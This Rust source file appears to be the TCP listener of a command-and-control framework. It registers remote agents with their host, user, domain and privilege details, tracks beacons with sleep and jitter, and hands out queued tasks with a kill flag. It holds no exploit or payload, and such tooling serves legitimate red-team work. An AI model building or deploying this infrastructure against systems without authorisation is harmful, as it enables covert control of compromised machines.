//! TCP listener — 4-byte big-endian length-prefixed JSON framing.

use crate::state::AppState;
use chrono::Utc;
use oxide_common::{
    protocol::{AgentBeacon, AgentRegister, BeaconResponse, SrvMessage, TCP_MAX_MSG},
    types::{AgentInfo, AgentStatus, ListenerConfig},
};
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::{TcpListener, TcpStream},
};
use tracing::{error, info, warn};
use uuid::Uuid;

pub async fn run(cfg: ListenerConfig, state: AppState) -> anyhow::Result<()> {
    let addr = format!("0.0.0.0:{}", cfg.port);
    let listener = TcpListener::bind(&addr).await?;
    info!("TCP listener on tcp://{}:{}", cfg.host, cfg.port);

    loop {
        match listener.accept().await {
            Ok((stream, peer)) => {
                info!("TCP agent connect from {peer}");
                let state_clone = state.clone();
                tokio::spawn(async move {
                    if let Err(e) = handle_conn(stream, state_clone).await {
                        warn!("TCP conn error: {e}");
                    }
                });
            }
            Err(e) => error!("TCP accept: {e}"),
        }
    }
}

async fn handle_conn(mut stream: TcpStream, state: AppState) -> anyhow::Result<()> {
    let mut agent_id: Option<Uuid> = None;

    loop {
        // Read 4-byte length prefix
        let mut len_buf = [0u8; 4];
        if stream.read_exact(&mut len_buf).await.is_err() {
            break;
        }
        let msg_len = u32::from_be_bytes(len_buf) as usize;

        if msg_len == 0 || msg_len > TCP_MAX_MSG {
            warn!("bad TCP msg len {msg_len}");
            break;
        }

        let mut body = vec![0u8; msg_len];
        stream.read_exact(&mut body).await?;

        // Try to parse as Register first, then Beacon
        if let Ok(reg) = serde_json::from_slice::<AgentRegister>(&body) {
            info!("TCP register: {} @ {}", reg.hostname, reg.ip);
            agent_id = Some(reg.agent_id);

            let now = Utc::now();
            let info = AgentInfo {
                id:           reg.agent_id,
                hostname:     reg.hostname,
                username:     reg.username,
                domain:       reg.domain,
                ip:           reg.ip,
                os:           reg.os,
                arch:         reg.arch,
                pid:          reg.pid,
                privilege:    reg.privilege,
                listener_id:  reg.listener_id,
                build_id:     reg.build_id,
                sleep_ms:     reg.sleep_ms,
                jitter_pct:   reg.jitter_pct,
                status:       AgentStatus::Active,
                first_seen:   now,
                last_seen:    now,
                missed_beats: 0,
            };
            state.upsert_agent(info).await;

            // ACK
            let ack = b"OK";
            let len = (ack.len() as u32).to_be_bytes();
            stream.write_all(&len).await?;
            stream.write_all(ack).await?;
        } else if let Ok(beacon) = serde_json::from_slice::<AgentBeacon>(&body) {
            if agent_id.is_none() {
                agent_id = Some(beacon.agent_id);
            }
            let aid = beacon.agent_id;

            {
                let mut inner = state.0.write().await;
                if let Some(a) = inner.agents.get_mut(&aid) {
                    a.last_seen = Utc::now();
                    a.status = AgentStatus::Active;
                    a.missed_beats = 0;
                }
            }

            for result in beacon.results {
                let _ = state.0.read().await.broadcast
                    .send(SrvMessage::TaskResult { result });
            }

            let tasks = state.drain_tasks(&aid).await;
            let resp = BeaconResponse { tasks, kill: false, new_sleep: None };
            let resp_bytes = serde_json::to_vec(&resp)?;
            let len = (resp_bytes.len() as u32).to_be_bytes();
            stream.write_all(&len).await?;
            stream.write_all(&resp_bytes).await?;
        } else {
            warn!("TCP: unrecognised message");
            break;
        }
    }

    Ok(())
}
